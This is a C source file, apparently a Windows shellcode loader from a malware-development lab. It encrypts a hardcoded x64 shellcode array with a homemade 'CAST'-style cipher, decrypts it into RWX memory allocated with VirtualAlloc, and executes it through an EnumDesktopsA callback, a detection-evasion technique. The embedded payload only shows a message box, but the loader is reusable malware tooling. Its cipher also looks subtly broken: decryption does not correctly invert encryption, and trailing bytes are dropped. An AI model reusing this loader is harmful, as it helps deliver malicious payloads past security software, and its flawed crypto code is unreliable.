#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#define BLOCK_SIZE 8
#define ROUNDS 16
#define KEY_SIZE 16

uint32_t key[4] = {0x01234567, 0x89abcdef, 0xfedcba98, 0x76543210};

void f1(uint32_t *d, uint32_t k) {
  uint32_t I = *d ^ k;
  uint32_t Ia = (I >> 16) & 0xFFFF;
  uint32_t Ib = I & 0xFFFF;
  uint32_t f = ((Ia + Ib) & 0xFFFF);
  *d = (*d + f) & 0xFFFFFFFF;
}

void f2(uint32_t *d, uint32_t k) {
  uint32_t I = *d ^ k;
  uint32_t Ia = (I >> 16) & 0xFFFF;
  uint32_t Ib = I & 0xFFFF;
  uint32_t f = ((Ia + Ib + 1) & 0xFFFF);
  *d = (*d ^ f) & 0xFFFFFFFF;
}

void f3(uint32_t *d, uint32_t k) {
  uint32_t I = *d ^ k;
  uint32_t Ia = (I >> 16) & 0xFFFF;
  uint32_t Ib = I & 0xFFFF;
  uint32_t f = ((Ia - Ib) & 0xFFFF);
  *d = (*d ^ f) & 0xFFFFFFFF;
}

void cast_key_schedule(uint32_t* key, uint32_t subkeys[ROUNDS][4]) {
  for (int i = 0; i < ROUNDS; i++) {
    subkeys[i][0] = key[0];
    subkeys[i][1] = key[1];
    subkeys[i][2] = key[2];
    subkeys[i][3] = key[3];
  }
}

void cast_encrypt(uint32_t* block, uint32_t subkeys[ROUNDS][4]) {
  uint32_t left = block[0];
  uint32_t right = block[1];

  for (int i = 0; i < ROUNDS; i++) {
    uint32_t temp = right;
    switch (i % 3) {
      case 0:
        f1(&right, subkeys[i][0]);
        break;
      case 1:
        f2(&right, subkeys[i][1]);
        break;
      case 2:
        f3(&right, subkeys[i][2]);
        break;
    }
    right ^= left;
    left = temp;
  }

  block[0] = right;
  block[1] = left;
}

void cast_decrypt(uint32_t* block, uint32_t subkeys[ROUNDS][4]) {
  uint32_t left = block[0];
  uint32_t right = block[1];

  for (int i = ROUNDS - 1; i >= 0; i--) {
    uint32_t temp = right;
    switch (i % 3) {
      case 0:
        f1(&right, subkeys[i][0]);
        break;
      case 1:
        f2(&right, subkeys[i][1]);
        break;
      case 2:
        f3(&right, subkeys[i][2]);
        break;
    }
    right ^= left;
    left = temp;
  }

  block[0] = right;
  block[1] = left;
}

void cast_encrypt_shellcode(unsigned char* shellcode, int shellcode_len, uint32_t subkeys[ROUNDS][4]) {
  for (int i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
    cast_encrypt((uint32_t*)(shellcode + i * BLOCK_SIZE), subkeys);
  }
}

void cast_decrypt_and_execute_shellcode(unsigned char* shellcode, int shellcode_len, uint32_t subkeys[ROUNDS][4]) {
  LPVOID mem_block = NULL;
  mem_block = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (mem_block == NULL) {
    printf("memory allocation failed\n");
    exit(1);
  }
  for (int i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
    uint32_t decrypted_block[2];
    memcpy(decrypted_block, shellcode + i * BLOCK_SIZE, BLOCK_SIZE);
    cast_decrypt(decrypted_block, subkeys);
    memcpy((char *)mem_block + i * BLOCK_SIZE, decrypted_block, BLOCK_SIZE);
  }
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem_block, (LPARAM)NULL);
}

int main() {
  unsigned char snowwolf[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
"\x8d\x8d\x2e\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
"\x00\x3e\x4c\x8d\x85\x1f\x01\x00\x00\x48\x31\xc9\x41\xba"
"\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
"\x56\xff\xd5\x48\x69\x2c\x49\x20\x61\x6d\x20\x53\x6e\x6f"
"\x77\x77\x6f\x6c\x66\x00\x47\x68\x6f\x73\x74\x20\x57\x6f"
"\x6c\x66\x20\x4c\x61\x62\x00\x75\x73\x65\x72\x33\x32\x2e"
"\x64\x6c\x6c\x00";

  int snowwolf_len = sizeof(snowwolf);
  unsigned char padded[snowwolf_len];
  memcpy(padded, snowwolf, snowwolf_len);
  uint32_t subkeys[ROUNDS][4];
  cast_key_schedule(key, subkeys);
  cast_encrypt_shellcode(padded, snowwolf_len, subkeys);
  cast_decrypt_and_execute_shellcode(padded, snowwolf_len, subkeys);

  return 0;
}
